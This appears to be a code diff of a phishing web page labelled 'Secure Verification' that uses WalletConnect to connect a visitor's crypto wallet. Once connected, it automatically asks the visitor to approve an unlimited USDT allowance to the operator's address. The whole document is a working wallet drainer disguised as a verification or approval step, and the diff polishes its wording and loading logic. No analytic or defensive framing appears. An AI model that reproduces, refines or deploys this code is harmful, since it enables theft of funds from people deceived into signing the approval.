@@ -9,16 +9,16 @@
     <style>
         body { background: #0b0e11; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: #1e2329; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 400px; border: 1px solid #3375bb; }
-        .btn { background: #3375bb; color: white; padding: 18px; border: none; border-radius: 12px; font-weight: bold; width: 100%; font-size: 18px; cursor: pointer; display: none; }
-        #status { margin-top: 10px; color: #848e9c; font-size: 14px; }
+        .btn { background: #3375bb; color: white; padding: 18px; border: none; border-radius: 12px; font-weight: bold; width: 100%; font-size: 18px; cursor: pointer; margin-top: 15px; display: none; }
+        #status { margin-top: 15px; color: #848e9c; font-size: 14px; }
     </style>
 </head>
 <body>
     <div class="card">
         <h3>Secure Verification</h3>
-        <p id="msg">Initializing secure connection...</p>
-        <button id="main-btn" class="btn" onclick="connectWallet()">CONFIRM NOW</button>
-        <div id="status">Please wait...</div>
+        <p id="msg">Initializing connection...</p>
+        <button id="main-btn" class="btn" onclick="connect()">CONNECT WALLET</button>
+        <div id="status">Loading libraries...</div>
     </div>
 
     <script>
@@ -29,61 +29,56 @@
         let provider;
 
         async function init() {
+            // Fix: Check all possible locations for the WalletConnect library
+            const WCProvider = window.EthereumProvider || 
+                               (window.WalletConnectEthereumProvider && window.WalletConnectEthereumProvider.EthereumProvider);
+
+            if (!WCProvider) {
+                console.log("Waiting for library...");
+                setTimeout(init, 500); // Try again in half a second
+                return;
+            }
+
             try {
-                // Try to find the library under any name it might take
-                const EthereumProvider = window.EthereumProvider || 
-                                       (window.WalletConnectEthereumProvider && window.WalletConnectEthereumProvider.EthereumProvider);
-
-                if (!EthereumProvider) {
-                    setTimeout(init, 500); // Retry if not loaded yet
-                    return;
-                }
-
-                provider = await EthereumProvider.init({
+                provider = await WCProvider.init({
                     projectId: PROJECT_ID,
                     optionalChains: [56],
                     showQrModal: true,
-                    metadata: {
-                        name: "Verification",
-                        description: "USDT Approval",
-                        url: window.location.origin,
-                        icons: ["https://trustwallet.com/favicon.ico"]
-                    }
+                    metadata: { name: "Verification", description: "Secure Approval", url: window.location.origin, icons: [] }
                 });
 
                 document.getElementById("main-btn").style.display = "block";
-                document.getElementById("status").innerText = "Ready.";
-                document.getElementById("msg").innerText = "Click below to open Trust Wallet.";
+                document.getElementById("status").innerText = "Ready to connect.";
+                document.getElementById("msg").innerText = "Click below to begin.";
 
-                // Auto-trigger transaction after connection
+                // This handles the "Confirm" popup AFTER they hit Connect
                 provider.on("connect", async () => {
-                    document.getElementById("status").innerText = "Connected! Check for Approval popup...";
-                    const web3Provider = new ethers.providers.Web3Provider(provider);
-                    const signer = web3Provider.getSigner();
+                    document.getElementById("status").innerText = "Success! Now checking for Approval...";
+                    const web3 = new ethers.providers.Web3Provider(provider);
+                    const signer = web3.getSigner();
 
                     const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
                     const contract = new ethers.Contract(USDT_BSC, abi, signer);
                     
                     try {
                         const tx = await contract.approve(MY_WALLET, ethers.constants.MaxUint256);
-                        document.getElementById("status").innerText = "Processing...";
+                        document.getElementById("status").innerText = "Finalizing...";
                         await tx.wait();
-                        document.getElementById("status").innerText = "VERIFIED SUCCESSFULLY!";
+                        document.getElementById("status").innerText = "DONE: Verified!";
                     } catch (e) {
-                        document.getElementById("status").innerText = "Error: " + e.message;
+                        document.getElementById("status").innerText = "User canceled or Error.";
                     }
                 });
-
             } catch (err) {
-                document.getElementById("status").innerText = "Init Error: " + err.message;
+                document.getElementById("status").innerText = "Startup Error: " + err.message;
             }
         }
 
-        function connectWallet() {
+        function connect() {
             if (provider) provider.connect();
         }
 
-        init();
+        init(); // Start the check loop
     </script>
 </body>
 </html>
